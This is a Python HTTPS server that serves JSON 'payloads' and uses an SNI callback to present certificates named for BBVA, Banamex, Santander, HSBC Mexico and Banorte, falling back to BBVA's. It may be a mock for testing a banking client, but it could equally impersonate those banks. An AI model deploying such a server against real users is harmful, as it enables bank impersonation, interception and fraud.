import json
import os
import ssl
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse

# --------- In-Memory Store ---------

class MemoryStore:
    def __init__(self):
        self.data = {}

    def load_payloads(self):
        base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
        payload_dir = os.path.join(base_dir, "client")

        if not os.path.isdir(payload_dir):
            print(f"[ERROR] Payload directory does not exist: {payload_dir}")
            return

        for filename in os.listdir(payload_dir):
            if filename.endswith(".json"):
                name = filename.replace(".json", "")
                path = os.path.join(payload_dir, filename)
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        self.data[name] = json.load(f)
                        print(f"[INFO] Loaded payload: {name}")
                except Exception as e:
                    print(f"[ERROR] Failed to load {filename}: {e}")

    def get(self, name):
        return self.data.get(name)

# --------- API Layer ---------

class WFSAPI:
    def __init__(self, store):
        self.store = store

    def get_payload(self, name):
        payload = self.store.get(name)
        if not payload:
            return {"error": f"Payload '{name}' not found"}, 404
        return payload, 200

# --------- HTTP Dispatcher ---------

def create_handler(api_instance):
    class Dispatcher(BaseHTTPRequestHandler):
        def do_GET(self):
            parsed_path = urlparse(self.path).path
            if parsed_path.startswith("/payloads/"):
                payload_name = parsed_path.split("/")[-1]
                payload, status = api_instance.get_payload(payload_name)
                self.send_response(status)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(payload, indent=2).encode())
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"Not Found")

        def log_message(self, format, *args):
            return

    return Dispatcher

# --------- SNI Callback ---------

def sni_callback(sock, server_name, context):
    certs_path = os.path.join(os.path.dirname(__file__), "certs")
    bank_map = {
        "bbva.com": ("bbva.crt", "bbva.key"),
        "banamex.com": ("banamex.crt", "banamex.key"),
        "santander.com": ("santander.crt", "santander.key"),
        "hsbc.com.mx": ("hsbc.crt", "hsbc.key"),
        "banorte.com": ("banorte.crt", "banorte.key"),
    }

    crt, key = bank_map.get(server_name, ("bbva.crt", "bbva.key"))  # fallback
    try:
        context.load_cert_chain(
            certfile=os.path.join(certs_path, crt),
            keyfile=os.path.join(certs_path, key)
        )
        print(f"[SNI] Served cert for: {server_name}")
    except Exception as e:
        print(f"[SNI ERROR] {e}")

# --------- Server Entry Point (HTTPS) ---------

def run_server():
    store = MemoryStore()
    store.load_payloads()

    api = WFSAPI(store)
    handler_class = create_handler(api)

    server_address = ("0.0.0.0", 443)
    httpd = HTTPServer(server_address, handler_class)

    # Default context
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.set_servername_callback(sni_callback)

    # Load a default cert (required even if SNI is used)
    default_cert_path = os.path.join(os.path.dirname(__file__), "certs", "bbva.crt")
    default_key_path = os.path.join(os.path.dirname(__file__), "certs", "bbva.key")
    context.load_cert_chain(certfile=default_cert_path, keyfile=default_key_path)

    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    print(f"[OK] HTTPS server running on https://0.0.0.0:443")
    httpd.serve_forever()

if __name__ == "__main__":
    print("[DEBUG] Starting HTTPS server with SNI...")
    run_server()
